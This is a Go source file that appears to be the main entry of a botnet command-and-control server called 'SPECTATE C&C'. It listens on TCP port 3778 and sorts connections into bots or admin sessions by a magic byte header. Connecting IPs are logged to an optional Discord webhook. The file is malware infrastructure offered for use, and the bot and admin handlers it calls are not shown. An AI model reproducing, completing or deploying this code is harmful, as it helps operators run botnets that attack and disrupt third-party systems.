package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "errors"
    "time"
)

const WebhookURL string = "" // Set your Discord webhook here if needed

type LoginSession struct {
    IP        string
    Timestamp time.Time
}

var lastLogins = make(map[string]LoginSession)

func SendWebhook(title string, description string, color int) {
    if WebhookURL == "" { return }
    payload := map[string]interface{}{
        "embeds": []map[string]interface{}{
            {
                "title":       title,
                "description": description,
                "color":       color,
                "footer":      map[string]string{"text": "SPECTATE v3.0 Logging"},
                "timestamp":   time.Now().Format(time.RFC3339),
            },
        },
    }
    body, _ := json.Marshal(payload)
    http.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
}

var clientList *ClientList = NewClientList()

func main() {
    fmt.Println("\x1b[38;2;255;0;0mStarting SPECTATE C&C.. >\x1b[0m")
    time.Sleep(500 * time.Millisecond)
    fmt.Println("\x1b[38;2;255;0;0mBooting System.. >\x1b[0m")
    time.Sleep(500 * time.Millisecond)
    fmt.Println("\x1b[38;2;255;255;255mSPECTATE is now ONLINE!\x1b[0m")
    fmt.Println("\x1b[38;2;255;255;255mListening on 0.0.0.0:3778\x1b[0m")

    tel, err := net.Listen("tcp", "0.0.0.0:3778")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        
        remoteAddr := conn.RemoteAddr().String()
        go SendWebhook("🌐 New Connection", fmt.Sprintf("**IP:** `%s`", remoteAddr), 0x00FFFF)
        
        go initialHandler(conn)
    }
}

func initialHandler(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(200 * time.Millisecond))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	
	if err != nil || l <= 0 {
		NewAdmin(conn).Handle()
		return
	}

    if l >= 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        NewBot(conn, buf[3], "").Handle()
    } else {
        NewAdmin(conn).Handle()
    }
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
